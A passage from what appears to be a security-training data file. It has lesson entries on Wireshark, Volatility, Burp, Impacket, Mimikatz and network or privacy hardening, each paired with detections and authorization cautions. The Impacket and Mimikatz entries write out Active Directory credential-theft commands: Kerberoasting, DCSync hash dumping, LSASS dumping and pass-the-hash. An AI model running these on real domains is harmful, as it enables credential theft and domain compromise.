        "caution": "Capturing traffic can expose other people's data and credentials — only capture on networks you own or are authorized to monitor. On shared/corporate networks, packet capture is often policy-restricted or unlawful without consent. Analyze your own lab traffic freely; treat any captured creds/PII as sensitive.",
        "cia": [
            "CONFIDENTIALITY — capture reveals anything sent in cleartext (creds, PII, tokens); it is the proof of why encryption matters, and an attacker's payoff on an unencrypted segment.",
            "DEFENSIVE / BLUE — the dominant use: incident response, threat hunting, and forensics. The pcap is ground truth when logs lie or are missing.",
            "INTEGRITY — spotting injected packets, ARP spoofing, rogue DHCP/RA, and retransmission anomalies that signal tampering or a man-in-the-middle.",
        ],
        "try_cmd": "tshark -D",
    },
    "volatility": {
        "summary": "The memory-forensics framework — parses a RAM dump to reconstruct what a machine was DOING at capture time: running processes, network connections, injected code, command history, and secrets that only ever live in memory. Volatility 3 is the `vol` command",
        "typical": "vol -f <memory.dmp> windows.pslist     (then windows.netscan, windows.cmdline, windows.malfind, windows.hashdump ...)",
        "mental_model": (
            "Disk forensics shows what was SAVED; memory forensics shows what was HAPPENING. RAM holds the live "
            "truth a disk never sees: decrypted data, injected/fileless malware, network sockets, typed "
            "commands, and credentials. Volatility maps a raw RAM image against the OS's own structures (the "
            "kernel's process list, handle tables, page tables) to rebuild that live state offline. You capture "
            "RAM once (the crime-scene photo), then ask it questions with plugins — each plugin walks a "
            "different kernel structure to answer 'what processes?', 'what connections?', 'what was hidden?'."
        ),
        "analogy": (
            "If the disk is the filing cabinet, RAM is the desk mid-work: papers open, a half-typed letter, the "
            "phone off the hook. A reboot sweeps the desk clean. Volatility is a photo of that desk you can walk "
            "around afterward — reading the open papers, seeing who was on the phone, finding the note that was "
            "never filed."
        ),
        "flags": {
            "vol":            "The Volatility 3 CLI. Usage is `vol -f <image> <plugin> [opts]` — the plugin does the work.",
            "-f <image>":     "The memory image to analyze (raw/dd, crash dump, VMware .vmem, etc.). Capture it with a tool like winpmem/avml; Volatility reads, never captures.",
            "windows.pslist / windows.pstree":"Running processes (pstree shows parent/child) — your first look. A child cmd.exe under winword.exe screams macro malware.",
            "windows.netscan":"Network connections + listening sockets at capture time — find C2 beacons and unexpected listeners.",
            "windows.cmdline / windows.consoles / windows.cmdscan":"What was actually run — command lines per process and recovered console history.",
            "windows.malfind":"Hunts injected/unbacked executable memory (classic process injection / fileless malware) — high-signal for 'what is hidden'.",
            "windows.dlllist / windows.handles":"Loaded modules and open handles per process — spot odd DLLs and what a process was touching.",
            "windows.hashdump / windows.lsadump / windows.cachedump":"Extract credential material that lived in memory (SAM hashes, LSA secrets, cached domain creds).",
            "-r json / -o <dir>":"Render as JSON for tooling, and set an output directory for dumped artifacts (processes/files).",
        },
        "read": [
            "Always start with pslist/pstree: the process tree tells the story. Unusual parent-child (Office spawning a shell), misspelled system names, or processes with no disk backing are immediate leads.",
            "Cross-check pslist against psscan: pslist walks the live list, psscan carve-scans for process structures — a process in psscan but NOT pslist may be hidden/unlinked (rootkit behavior).",
            "netscan ties a suspicious process to an external IP — that is your pivot from 'weird process' to 'active C2'.",
            "malfind output with RWX private memory + an MZ header = injected code; dump it and analyze in Ghidra.",
            "The right symbol tables matter: Vol3 auto-detects from the image build; if plugins return nothing, the symbols/image may be mismatched or the dump truncated.",
        ],
        "zoom": {
            "eli5": "When a computer is on, RAM holds what it is doing right now — even stuff never saved to disk. If you grab a copy of RAM, Volatility lets you look inside afterward to see what programs ran, who they talked to, and what was hidden.",
            "operator": "Acquire RAM with a dedicated tool, then interrogate it: pslist/pstree for processes, netscan for connections, cmdline/consoles for what ran, malfind for injection, hashdump/lsadump for creds. Dump suspicious processes and hand them to Ghidra. JSON output (-r json) feeds the rest of your pipeline.",
            "deep": "Volatility 3 parses physical memory by reconstructing virtual address spaces from page tables and walking documented kernel objects (process lists, VAD trees, handle tables, registry hives mapped in memory). It uses ISF symbol tables generated from PDBs to locate structures for the exact build. Anti-forensics (DKOM unlinking) is countered by pool/structure scanning (psscan vs pslist). Beyond Windows it has linux.* and mac.* plugins (linux.bash recovers shell history straight from memory).",
        },
        "apply": [
            "Capture RAM on the live host with a purpose-built acquirer (winpmem on Windows, avml/LiME on Linux) to a file — Volatility analyzes that file, it does not capture.",
            "Triage: `vol -f mem.raw windows.pstree` then `vol -f mem.raw windows.netscan` — processes and their connections in two commands.",
            "What ran: `vol -f mem.raw windows.cmdline` and `windows.consoles`; hidden code: `vol -f mem.raw windows.malfind` (add -o to extract injected regions).",
            "Pull a suspicious process to disk and reverse it in Ghidra — memory forensics feeds RE.",
            "Linux box? `vol -f mem.lime linux.pslist` / `linux.bash` recovers processes and the attacker's typed shell history.",
        ],
        "next": [
            "ghidra (reverse the injected code volatility dumps)",
            "incident-response (where memory forensics sits in the IR workflow)",
            "wireshark (correlate netscan connections with captured packets)",
            "yara (scan the memory image for known-bad signatures)",
        ],
        "caution": "Memory images contain everything that was in RAM — passwords, keys, personal data. Handle them as highly sensitive evidence: chain-of-custody for real IR, and only acquire memory from systems you own or are authorized to investigate.",
        "cia": [
            "DEFENSIVE / BLUE — the core use: incident response, malware analysis, and threat hunting. Memory is where fileless/injected threats are caught when disk and logs show nothing.",
            "CONFIDENTIALITY — RAM holds decrypted secrets (keys, tokens, passwords); a memory image both exposes them to a forensicator and is itself sensitive if it leaks.",
            "INTEGRITY — detecting hidden/unlinked processes and injected code reveals tampering with the running system that disk artifacts miss.",
        ],
        "try_cmd": "vol -h",
    },
    "burp": {
        "summary": "The web-app testing workhorse — an intercepting HTTP(S) proxy that sits between your browser and the target so you can SEE, PAUSE, EDIT, and REPLAY every request. Manual web testing lives here",
        "typical": "configure browser -> Burp proxy (127.0.0.1:8080) -> install Burp's CA cert -> browse the app (Proxy/HTTP history) -> send interesting requests to Repeater/Intruder",
        "mental_model": (
            "A browser hides the HTTP that powers a web app — it just shows you the rendered page. Burp inserts "
            "itself as a man-in-the-middle on YOUR OWN traffic so the raw requests/responses become visible and "
            "editable. Once you can change any field of any request before it reaches the server — a parameter, "
            "a header, a cookie, a hidden field — you can test what the server does with input it never "
            "expected. That single capability (controlled request tampering + replay) is the foundation of "
            "nearly all manual web testing."
        ),
        "analogy": (
            "Your browser is a polite waiter who only shows you the finished plate. Burp is standing in the "
            "kitchen doorway: you read every order ticket going in, rewrite it ('hold the auth check', 'table 5 "
            "is now admin'), and watch what the kitchen sends back — then re-send the same ticket a hundred ways "
            "until something interesting happens."
        ),
        "flags": {
            "Proxy":          "The MITM core — intercept, view, and modify requests/responses; HTTP history is the record of everything the app did. Where you start.",
            "Repeater":       "Hand-edit a single request and resend it endlessly — the manual testing scalpel (tweak a param, read the response, repeat).",
            "Intruder":       "Automate a request with payload positions — fuzzing, brute-forcing, enumeration. Community edition throttles it; Pro is full-speed.",
            "Target / Site map":"The discovered structure of the app and your scope — keeps testing inside authorized boundaries.",
            "Decoder / Comparer":"Encode/decode (URL, base64, hashes) and diff two responses — small tools you reach for constantly.",
            "Scanner (Pro)":  "Automated crawl + vuln scanning — Pro-only; the free edition is manual-first (the better way to learn anyway).",
            "Extensions (BApp)":"Add capability via the BApp store or custom extensions (authz testing, JWT tooling, session handling).",
        },
        "steps": [
            {
                "cmd": "Proxy -> Intercept ON -> browse the target through Burp",
                "do": "Route the browser through Burp and capture live requests as you use the app.",
                "why_now": "You can't test what you can't see; first make the app's real HTTP visible and mapped (HTTP history + Site map).",
                "watch_for": "Parameters, cookies, hidden fields, and API calls. Note anything that looks like an ID, a role, a redirect, or a file path.",
                "means": "A map of the attack surface and a pile of real requests to tamper with.",
                "blue": "All of this is normal client traffic — invisible to the server as 'an attack'. Defense starts server-side: never trust client input, enforce authz on the server.",
            },
            {
                "cmd": "Right-click a request -> Send to Repeater -> edit a field -> Send",
                "do": "Take one interesting request and hand-modify a parameter/header/cookie, then resend and read the response.",
                "why_now": "This is the heart of manual testing — probe how the server handles unexpected input (IDOR, auth bypass, injection) one controlled change at a time.",
                "watch_for": "Changed behavior: another user's data (IDOR), an error leaking a stack trace (injection), a 200 where you expected 403 (broken access control).",
                "means": "Confirmation of a specific flaw, reproducible from a single request you control.",
                "blue": "These map to OWASP A01/A03. Defenses: server-side authorization checks, parameterized queries, input validation, and generic error messages.",
            },
            {
                "cmd": "Send to Intruder -> mark payload positions -> load a wordlist -> Start",
                "do": "Automate the same request across many payloads — fuzz a parameter, enumerate IDs, or test a login.",
                "why_now": "When one manual test shows promise, Intruder scales it to find the needle (the one ID/payload that behaves differently).",
                "watch_for": "Outliers in status code, response length, or time — the row that differs is usually the hit.",
                "means": "Enumerated objects, a working payload, or valid creds — the exploit candidate.",
                "blue": "Detectable: bursts of similar requests. Defenses: rate limiting, lockout, WAF anomaly rules, and per-object authorization so enumeration yields nothing.",
            },
        ],
        "read": [
            "HTTP history is your evidence log — every request the app made flows through it; filter by host/MIME to cut noise.",
            "Repeater is where understanding happens; Intruder is where you scale it. Learn Repeater cold before automating.",
            "Scope matters: set Target scope and 'show only in-scope' so you never accidentally hammer something out of bounds.",
            "The community (free) edition throttles Intruder and has no Scanner — fine for learning; the manual workflow is the skill that transfers.",
            "Burp's CA cert must be trusted by the browser or HTTPS breaks — installing it is the usual first-time snag.",
        ],
        "zoom": {
            "eli5": "A website talks to its server in messages you normally don't see. Burp catches those messages so you can read them, change them, and send them again — which is how you find security holes in web apps.",
            "operator": "Proxy your browser through Burp, map the app via HTTP history/Site map, then drive findings with Repeater (manual) and Intruder (automated). Keep everything in scope. Decode/compare as needed; extend with BApps.",
            "deep": "Burp is a TLS-terminating intercepting proxy with a toolchain over the request store: Repeater (manual replay), Intruder (payload engine with sniper/cluster-bomb/pitchfork modes), Sequencer (token entropy), and in Pro a crawler+scanner. It re-signs TLS with its own CA so it can read/modify HTTPS. Extensions via the Montoya API let you script request handling, custom scan checks, and complex session auth.",
        },
        "next": [
            "zap (the free, open-source alternative proxy)",
            "sqlmap (automate the SQLi that Repeater reveals)",
            "owasp (the Top 10 categories you're testing for)",
            "nuclei (template scanning to complement manual testing)",
        ],
        "caution": "An intercepting proxy lets you send the server anything — only point Burp at applications you own or are explicitly authorized to test, and keep Target scope set so automated tools (Intruder/Scanner) can't stray. Active scanning/Intruder can damage or knock over fragile apps; throttle on production-like targets.",
        "cia": [
            "CONFIDENTIALITY — request tampering surfaces IDOR/broken access control that exposes other users' data (OWASP A01).",
            "INTEGRITY — replaying/altering requests tests whether the server lets you change state you shouldn't (forged actions, privilege escalation).",
            "DEFENSIVE — every finding maps to a server-side fix (authz checks, input validation, parameterized queries); Burp is also how defenders validate those fixes hold.",
        ],
        "try_cmd": "burpsuite",
    },
    "impacket": {
        "summary": "A Python toolkit of ready-made implementations of Windows network protocols (SMB, MSRPC, Kerberos, LDAP, NTLM) — packaged as a suite of impacket-* scripts that perform classic Active Directory attacks and admin tasks straight from Linux",
        "typical": "impacket-GetUserSPNs <dom>/<user>:<pass> -dc-ip <DC> -request   (Kerberoast)   |   impacket-secretsdump <dom>/<user>:<pass>@<DC> -just-dc   (dump AD hashes)   |   impacket-psexec <dom>/<user>:<pass>@<host>   (exec)",
        "mental_model": (
            "Windows networks run on a stack of protocols (SMB, RPC, Kerberos, LDAP, NTLM). Microsoft's tools "
            "speak them from Windows; Impacket re-implements them in pure Python so an operator on Kali can "
            "speak them too — authenticate, query the directory, request tickets, exec commands, relay auth. "
            "Each impacket-* script is one protocol interaction weaponized into a single task. Knowing the suite "
            "is really knowing the AD attack PRIMITIVES: get a foothold credential, roast tickets, dump secrets, "
            "move laterally."
        ),
        "analogy": (
            "Active Directory is a giant office that only speaks a set of bureaucratic dialects (forms in "
            "triplicate, signed tickets, badge readers). Windows employees speak them natively. Impacket is a "
            "fluent outsider who learned every dialect perfectly — so they can walk in, file the right forms, "
            "request the right tickets, and ask the records office for everything, all without a Windows machine."
        ),
        "flags": {
            "impacket-GetUserSPNs":"KERBEROASTING — request service tickets (TGS) for accounts with SPNs; the hashes crack offline to reveal service-account passwords. -request outputs hashcat format.",
            "impacket-secretsdump":"Dump credential material: local SAM + LSA from a host, or the whole domain's NTLM hashes from a DC with -just-dc (DCSync). The credential jackpot.",
            "impacket-psexec / -wmiexec / -smbexec / -atexec":"Remote command execution over different protocols (named-pipe service, WMI, SMB, scheduled task) — pick by footprint; wmiexec/atexec are quieter than psexec.",
            "impacket-ntlmrelayx":"Relay captured NTLM authentication to other services (SMB/LDAP/HTTP) — the back half of the responder -> relay attack; can dump or create accounts.",
            "impacket-GetNPUsers":"ASREPROAST — pull crackable material for accounts that don't require Kerberos pre-auth (no creds needed if you have a user list).",
            "impacket-getTGT / -getST":"Request Kerberos TGT/service tickets directly (pass-the-ticket, ticket abuse) given a key or hash.",
            "Auth syntax":"Most scripts take [domain/]user[:password]@target, plus -hashes LM:NT for pass-the-hash, -k for Kerberos, -dc-ip to point at the domain controller.",
        },
        "steps": [
            {
                "cmd": "impacket-GetNPUsers <dom>/ -dc-ip <DC> -usersfile users.txt -no-pass",
                "do": "ASREProast — ask the DC for any user that has Kerberos pre-auth disabled; the response is crackable offline.",
                "why_now": "It needs no credentials — just a user list — so it's an early, low-noise way to turn a username into a crackable hash.",
                "watch_for": "A returned $krb5asrep$ hash. That's a candidate password to crack with hashcat.",
                "means": "A first foothold credential if anyone has pre-auth disabled (a common misconfig).",
                "blue": "Detect: TGT requests / pre-auth failures for many users. Defend: require pre-auth on all accounts, strong passwords, alert on AS-REQ enumeration.",
            },
            {
                "cmd": "impacket-GetUserSPNs <dom>/<user>:<pass> -dc-ip <DC> -request",
                "do": "Kerberoast — request service tickets for SPN-bearing accounts; the ticket is encrypted with the service account's password hash.",
                "why_now": "Any authenticated user can request these, so a single low-priv credential can yield high-value service-account hashes.",
                "watch_for": "$krb5tgs$ hashes, especially for accounts in privileged groups — crack them offline with hashcat.",
                "means": "Often a service account with elevated rights — a big privilege jump if the password is weak.",
                "blue": "Detect: bulk TGS-REQs (Event 4769). Defend: 30+ char managed service-account passwords (gMSA), least-privilege SPNs, AES-only.",
            },
            {
                "cmd": "impacket-secretsdump <dom>/<admin>:<pass>@<DC> -just-dc-ntlm",
                "do": "DCSync — with domain-admin-equivalent rights, ask the DC to replicate every account's password hash.",
                "why_now": "It's the endgame credential grab: the whole domain's hashes, including krbtgt (the keys to forge any ticket).",
                "watch_for": "The full directory dump — every user:hash, and the krbtgt hash.",
                "means": "Total domain compromise (pass-the-hash anywhere, golden-ticket capability).",
                "blue": "Detect: replication (DRSUAPI) sourced from non-DC hosts. Defend: tier-0 isolation, restrict replication rights, monitor for DCSync, rotate krbtgt twice on suspicion.",
            },
        ],
        "read": [
            "Impacket is the PLUMBING under many other tools (CrackMapExec, BloodHound ingestors, ntlmrelayx) — learning it explains how they actually work.",
            "The credential you hold dictates the script: cleartext (user:pass), a hash (-hashes for pass-the-hash), or a ticket (-k for pass-the-ticket). Same attacks, different key material.",
            "Exec choice is an OpSec choice: psexec drops a service (loud, logged), wmiexec/atexec are quieter and more fileless. Pick by detection risk.",
            "Roasting outputs feed hashcat directly (modes 18200 AS-REP, 13100 TGS) — impacket gets the hash, hashcat cracks it, the cycle repeats deeper into the domain.",
            "Almost everything keys off the DC: -dc-ip and accurate time (Kerberos is time-sensitive; sync your clock or tickets fail).",
        ],
        "zoom": {
            "eli5": "Windows networks talk in special languages to log in, hand out tickets, and run commands. Impacket is a set of Linux tools that speak those languages perfectly, so a tester can do Windows-network tasks — and classic attacks — without a Windows computer.",
            "operator": "Use the right script for the primitive: GetNPUsers/GetUserSPNs to turn access into crackable hashes, secretsdump to harvest credentials (DCSync on a DC), the *exec family to run commands, ntlmrelayx to relay captured auth. Drive auth with passwords, -hashes, or -k tickets; always point -dc-ip at the controller.",
            "deep": "Impacket implements the wire protocols directly (SMB1-3, DCE/RPC including DRSUAPI for DCSync and SAMR/LSARPC, full Kerberos AS/TGS exchanges, LDAP, NTLMSSP). That is why it can DCSync (replicate via DRSUAPI), forge tickets (krbtgt -> golden; a service hash -> silver), pass-the-hash via NTLMSSP, and relay NTLM where signing isn't enforced. It is a library first (used programmatically) and the scripts are thin CLIs over it.",
        },
        "next": [
            "crackmapexec (swiss-army sweep that wraps much of this across hosts)",
            "bloodhound (find WHICH accounts to roast/target — the attack-path map)",
            "hashcat (crack the roasted hashes impacket produces)",
            "mimikatz (the on-host Windows counterpart for credential extraction)",
        ],
        "caution": "These are real Active Directory attack tools. Use ONLY in your own lab or an engagement with explicit written authorization and defined scope — DCSync, relay, and ticket attacks against a production domain are high-impact and illegal without permission. The value here is understanding the primitives so you can DEFEND them (detection + hardening above).",
        "cia": [
            "CONFIDENTIALITY — secretsdump/roasting expose the domain's credentials, the ultimate confidentiality breach in a Windows environment.",
            "INTEGRITY — ticket forgery (golden/silver) and relay let an attacker impersonate any identity and forge authenticated actions — total loss of authentication integrity.",
            "DEFENSIVE / BLUE — each technique has concrete detections (4769/4768 anomalies, DRSUAPI from non-DCs, relay signatures) and hardening (gMSA, pre-auth, signing/EPA, tiering, krbtgt rotation). Teaching the attack IS teaching the defense.",
        ],
        "try_cmd": "impacket-GetUserSPNs -h",
    },
    "mimikatz": {
        "summary": "The infamous Windows credential-extraction tool — pulls hashes, Kerberos tickets, and (on legacy configs) plaintext passwords out of memory and the registry, and performs pass-the-hash / pass-the-ticket / golden-ticket attacks. The reason modern Windows credential defenses exist",
        "typical": "(on a Windows host, elevated)  privilege::debug  ->  sekurlsa::logonpasswords   |   lsadump::sam   |   sekurlsa::tickets   (Windows-only and heavily monitored — study the concepts here)",
        "mental_model": (
            "To support single sign-on, Windows historically kept usable credential material in the memory of "
            "the LSASS process — sometimes reversibly, so it could re-auth you to network resources. Mimikatz's "
            "core trick is simply READING LSASS memory (and registry hives) and decoding those structures back "
            "into passwords, hashes, and tickets. From there, because Windows auth accepts a hash or a ticket as "
            "proof (not just a password), the same secrets enable impersonation WITHOUT cracking anything: "
            "pass-the-hash, pass-the-ticket, and — with the domain's krbtgt key — forging a 'golden ticket' that "
            "is any user, anywhere. Understanding mimikatz is understanding why credentials in memory are the "
            "crown-jewel target."
        ),
        "analogy": (
            "LSASS is the building's badge office, which in the old design kept a copy of everyone's master key "
            "so doors would open smoothly. Mimikatz is someone who walks into that office and photographs the "
            "key drawer. Worse, the building's locks accept a photo of a key as readily as the key itself (that "
            "is pass-the-hash) — and if you photograph the master-key stamping machine (krbtgt), you can mint a "
            "key for any door (the golden ticket)."
        ),
        "flags": {
            "privilege::debug":"Acquire SeDebugPrivilege — the prerequisite for reading other processes' memory. Fails without local admin; that requirement is itself a control.",
            "sekurlsa::logonpasswords":"The signature action — dump credentials (hashes, and on legacy/WDigest-enabled systems plaintext) of logged-on users from LSASS memory.",
            "sekurlsa::tickets / kerberos::list":"Extract Kerberos tickets from memory for pass-the-ticket; list cached tickets.",
            "lsadump::sam / ::lsa / ::secrets":"Read local SAM hashes and LSA secrets from registry hives (works offline against saved hives too).",
            "sekurlsa::pth":"Pass-the-hash — start a process authenticated as a user using only their NTLM hash, no password.",
            "kerberos::golden / ::silver":"Forge Kerberos tickets — golden (krbtgt hash = any user, long-lived) or silver (a service hash = that service). The impersonation/persistence endgame.",
            "dpapi:: / vault::":"Decrypt DPAPI-protected secrets and Windows Credential Vault items (saved/browser credentials).",
        },
        "read": [
            "Mimikatz is WINDOWS-ONLY and one of the most-signatured tools in existence — modern EDR/AV flag the binary, its strings, and its LSASS access on sight. Operators rarely run it raw; the VALUE for you here is conceptual: what's possible and how it's stopped.",
            "The headline defenses largely killed the scariest part: WDigest plaintext is off by default since Windows 8.1/2012R2, Credential Guard isolates LSASS secrets in a VBS enclave, and LSASS-as-PPL (RunAsPPL) blocks easy memory reads.",
            "Detection is mature: Sysmon Event 10 (process access to lsass.exe), Defender ASR 'block credential stealing from LSASS', and EDR memory-read telemetry. LSASS touched by a non-system process is a top alert.",
            "Hash/ticket = access: because Windows accepts NTLM hashes and Kerberos tickets as proof of identity, stolen secrets enable impersonation without ever cracking a password — which is why the secrets themselves must be protected, not just made 'strong'.",
            "Kali bundles mimikatz under /usr/share/windows-resources/mimikatz (Windows binaries you'd deploy to a Windows target) and ships kiwi_passwords.yar — a YARA rule to DETECT it, which shows you exactly how defenders hunt it.",
        ],
        "zoom": {
            "eli5": "When you log into Windows, the computer keeps some login secrets in memory so you don't retype them. Mimikatz reads those secrets out of memory. Newer Windows hides them much better — and security software watches for anyone trying to peek.",
            "operator": "Conceptually: with local admin you enable debug, read LSASS for hashes/tickets or read registry hives for SAM/LSA secrets, then reuse them via pass-the-hash / pass-the-ticket / golden ticket. In practice it's heavily detected and often blocked by Credential Guard / LSASS PPL; operators favor lower-signature methods and assume EDR is watching LSASS.",
            "deep": "Mimikatz parses LSASS's in-memory credential providers (msv1_0 NTLM, kerberos, wdigest, tspkg, livessp) and decrypts cached secrets using LSASS's own keys; lsadump reads the SAM/SECURITY/SYSTEM hives. Because Kerberos trusts anything encrypted with krbtgt's key, knowing that hash lets it forge TGTs (golden tickets) with arbitrary membership and lifetime; a service account hash forges service tickets (silver). Defenses break the chain at each link: Credential Guard (VBS isolation of LSASS secrets), RunAsPPL (protected LSASS), disabling WDigest, Restricted Admin / Remote Credential Guard (don't expose creds over RDP), tiered administration, and rotating krbtgt twice to invalidate golden tickets.",
        },
        "next": [
            "impacket (the Linux/remote counterpart — DCSync, roasting, relay from off-host)",
            "bloodhound (find whose credentials are worth stealing — the path to DA)",
            "crackmapexec (spray reused hashes/creds across the network)",
            "incident-response (the detect/contain/evict side of a credential-theft compromise)",
        ],
        "caution": "Mimikatz performs real credential theft and is illegal to use on systems you don't own or aren't explicitly authorized to test. It's Windows-only (won't run on this Pi) and is taught here for understanding and DEFENSE — every module above maps to a concrete control (Credential Guard, LSASS PPL, WDigest off, tiering, krbtgt rotation, LSASS-access monitoring). Don't deploy it outside a lab or authorized engagement.",
        "cia": [
            "CONFIDENTIALITY — it directly steals the most sensitive secrets a Windows host holds: passwords, hashes, and tickets in memory.",
            "INTEGRITY — pass-the-hash/ticket and golden tickets let an attacker authenticate AS anyone and forge trusted actions, destroying authentication integrity domain-wide.",
            "DEFENSIVE / BLUE — the entire modern Windows credential-protection stack (Credential Guard, PPL, WDigest-off, tiering, Sysmon LSASS monitoring, the bundled YARA rule) exists specifically to counter what mimikatz demonstrates. Learn it to defend it.",
        ],
        "try_cmd": "cat /usr/share/windows-resources/mimikatz/kiwi_passwords.yar",
    },
    "network-silence": {
        "summary": "Keep the OS quiet on a network — silence the chatty protocols that announce your presence, name, and intentions — to blend in (red-team OpSec) AND shrink your attack surface (blue-team hardening)",
        "typical": "audit with tcpdump -> disable LLMNR/NBT-NS/mDNS -> tame IPv6 -> randomize MAC + blank hostname -> default-deny egress -> re-verify with a sniffer",
        "mental_model": (
            "Out of the box an OS is a chatterbox. The moment it joins a network it starts broadcasting: 'I "
            "exist, my name is X, I'm looking for a printer, who has this hostname?' Each protocol behind that "
            "(mDNS, LLMNR, NetBIOS, SSDP, IPv6 autoconfig, DHCP) is a convenience feature that trades privacy "
            "for plug-and-play. Going silent means auditing every UNSOLICITED packet your host emits and "
            "disabling the ones you don't need — until the host only speaks when spoken to, and only says what "
            "it must."
        ),
        "analogy": (
            "A default OS on a network is like a person walking into a party shouting their full name, who "
            "they're looking for, and what they want — to everyone, constantly. Going silent is learning to "
            "stand quietly, speak only when addressed, and never volunteer your ID. An eavesdropper (a sniffer, "
            "or a poisoning tool) feeds on the shouting; a quiet guest gives them nothing to work with."
        ),
        "flags": {
            "LLMNR (UDP 5355)":  "Link-Local Multicast Name Resolution — broadcasts the names you look up when DNS fails; poisoning tools abuse it to steal NetNTLM hashes. Kill it: systemd-resolved 'LLMNR=no' / Windows GPO 'turn off multicast name resolution'.",
            "NetBIOS-NS (UDP 137)":"Legacy Windows name service — same hash-theft risk as LLMNR. Disable NetBIOS over TCP/IP per-adapter (Windows); unused on modern Linux.",
            "mDNS (UDP 5353)":   "multicast DNS / Bonjour / Avahi — advertises your hostname and services on .local. Disable: mask avahi-daemon (Linux); disable Bonjour if unneeded (Win/macOS).",
            "SSDP/UPnP (UDP 1900)":"Service discovery — announces and hunts for UPnP devices. Disable SSDP / Function Discovery unless you genuinely need device discovery.",
            "IPv6 RS/RA + RDNSS":"IPv6 autoconfig leaks presence and will ACCEPT attacker-supplied routes/DNS (the mitm6 attack). Prefer DHCPv6 or disable IPv6 if unused; enable RA Guard on the switch.",
            "DHCP hostname (opt 12)":"Your DHCP request volunteers your hostname to the whole segment and the DHCP log. Blank or anonymize the sent hostname.",
            "MAC address":       "The NIC's burned-in MAC is a stable per-device identifier trackable across networks. Randomize per-network (macchanger / NetworkManager cloned-mac-address=random).",
            "Egress (outbound)": "A default-allow firewall lets any process phone home. Set default-deny outbound + allowlist only what's needed — the backstop for anything still chatty or compromised.",
        },
        "read": [
            "The biggest single win is killing LLMNR + NBT-NS + mDNS — that one change defeats the most common internal hash-theft path (poison the name lookup -> capture NetNTLM -> relay it).",
            "Don't trust 'I disabled it' — VERIFY. Put a second host in promiscuous mode (tcpdump/wireshark) and confirm your machine emits nothing unsolicited at boot and idle.",
            "IPv6 is the silent leak: even on an 'IPv4 network' your host may autoconfigure IPv6 and accept a rogue RA/DNS (mitm6). Handle IPv6 explicitly — never just ignore it.",
            "Silence has usability tradeoffs — mDNS off can break AirPlay/printer discovery; egress-deny can break updates. Document what you turned off and why.",
            "A quiet host is not an invisible host — ARP, switch MAC tables, and your actual traffic still place you. Silence reduces exposure, it doesn't erase it.",
        ],
        "zoom": {
            "eli5": "Computers blurt out their name and what they want the moment they join a network. This teaches you to make yours stop blurting, so snoops and attackers can't easily see or impersonate you.",
            "operator": "Audit and disable broadcast/multicast name services (LLMNR, mDNS, NetBIOS-NS, SSDP), tame IPv6 autoconfig, stop leaking your hostname via DHCP, randomize your MAC, and lock egress with a default-deny firewall. Then verify with a sniffer that the host emits nothing unsolicited.",
            "deep": "The leak surface is mostly link-local multicast/broadcast: LLMNR (UDP 5355), mDNS (UDP 5353), NetBIOS-NS (UDP 137), SSDP/UPnP (UDP 1900), plus ICMPv6 RS/RA + RDNSS and DHCP option 12 (hostname)/option 55. These are weaponized: name-poisoning tools spoof LLMNR+NBT-NS+mDNS replies to capture NetNTLM and relay it; mitm6 abuses IPv6 RA+DHCPv6 to become your DNS/router. Defense: disable the services (resolved LLMNR=no, mask avahi, disable wsdd/NetBIOS), set IPv6 to DHCPv6-only or off with RA Guard, blank the DHCP hostname, randomize MAC per-network, and enforce egress filtering so even a process that speaks can't reach out.",
        },
        "apply": [
            "Inventory first: from another box, run `tcpdump -i <iface> -n 'multicast or broadcast'` (as root) and watch what your host shouts at boot and idle. That list IS your kill-list.",
            "Linux name services: set 'LLMNR=no' and 'MulticastDNS=no' in /etc/systemd/resolved.conf (or per-link), then mask the avahi-daemon service. Re-test with tcpdump.",
            "Windows: GPO/registry 'Turn off multicast name resolution' (kills LLMNR), disable NetBIOS over TCP/IP on each adapter, and stop SSDP Discovery + Function Discovery if unused.",
            "IPv6: if you don't use it, disable it; if you do, prefer DHCPv6 and turn on RA Guard at the switch. This shuts the mitm6 door.",
            "Identity: randomize MAC per-network (NetworkManager wifi.cloned-mac-address=random / ethernet.cloned-mac-address=random) and blank the DHCP-sent hostname.",
            "Egress backstop: default-deny outbound in your host firewall and allowlist only required destinations/ports — the safety net for anything you missed.",
        ],
        "next": [
            "responder (run it in a LAB to watch what a silenced host denies the attacker — see the threat you're closing)",
            "wireshark / tcpdump (verify silence — the proof step, non-negotiable)",
            "privacy-hardening (the host + identity privacy companion lesson)",
            "nftables / ufw (build the default-deny egress backstop)",
        ],
        "caution": "Test in a lab or maintenance window — disabling name services, IPv6, or egress can break printing, discovery, updates, or domain features. On managed/enterprise hosts, coordinate via change control: silencing a domain member's LLMNR/NBT-NS is usually a win, but do it knowingly. Defensive hardening on systems you own or administer.",
        "cia": [
            "CONFIDENTIALITY — primary. Silence stops the host leaking its identity, name lookups, and presence, and closes the LLMNR/NBT-NS/mDNS channel that hands attackers your credentials.",
            "INTEGRITY — disabling rogue-RA/mitm6 and NTLM-relay paths stops attackers inserting themselves as your router/DNS or replaying your auth, protecting session integrity.",
            "AVAILABILITY — the tradeoff to manage: over-silencing (egress deny, mDNS off) breaks legitimate services. The goal is minimal NECESSARY chatter, not a mute host that can't work.",
        ],
        "try_cmd": "tcpdump -i eth0 -n 'multicast or broadcast'",
    },
    "privacy-hardening": {
        "summary": "Reduce what a host and its user leak about identity, location, and activity — telemetry, DNS, traffic, metadata, and persistent identifiers — so you are harder to track, profile, or correlate",
        "typical": "define threat model -> randomize identifiers (MAC/hostname) + kill telemetry -> encrypt resolution (DoH) + transit (VPN/Tor) -> encrypt at rest (LUKS) -> scrub metadata -> verify no leaks",
        "mental_model": (
            "Privacy on an OS is about controlling identifiers and observability across four layers: WHO you are "
            "(identifiers — MAC, hostname, account, hardware IDs), WHAT you ask (DNS + the destinations you "
            "connect to), WHAT you send (traffic content and its metadata), and WHAT you leave behind (logs, "
            "caches, file metadata, telemetry). Every layer leaks by default. Hardening means, layer by layer, "
            "either removing the identifier, encrypting the channel, or anonymizing the source — and accepting "
            "that perfect privacy is impossible, so you optimize for YOUR specific threat model."
        ),
        "analogy": (
            "Privacy is like mailing a letter. Encryption (TLS/VPN) is a sealed envelope — the contents are "
            "hidden. But the envelope still shows your return address (your IP/identity), the destination (who "
            "you talk to = metadata), and the postmark (timing/location). Real privacy means sealing the "
            "envelope AND removing the return address AND routing through enough relays (Tor) that no single "
            "observer sees both ends. Most 'privacy' tools only seal the envelope and call it done."
        ),
        "flags": {
            "MAC randomization": "The NIC MAC is a stable cross-network tracker (especially on WiFi). Randomize per-network so you can't be followed venue to venue.",
